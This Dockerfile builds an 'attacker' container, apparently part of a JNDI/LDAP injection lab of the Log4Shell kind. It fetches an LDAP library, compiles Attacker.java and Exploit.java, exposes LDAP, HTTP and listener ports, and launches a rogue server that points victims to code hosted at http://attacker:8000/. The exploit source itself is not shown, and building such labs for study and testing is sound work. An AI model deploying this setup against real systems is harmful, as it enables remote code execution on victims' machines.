FROM eclipse-temurin:17-jdk
WORKDIR /app
RUN curl -sL -o unboundid-ldapsdk.jar https://repo1.maven.org/maven2/com/unboundid/unboundid-ldapsdk/6.0.11/unboundid-ldapsdk-6.0.11.jar
COPY Attacker.java Exploit.java ./
RUN javac -cp unboundid-ldapsdk.jar Attacker.java && javac --release 8 Exploit.java
EXPOSE 1389 8000 9001
CMD ["java", "-cp", ".:unboundid-ldapsdk.jar", "Attacker", "http://attacker:8000/"]
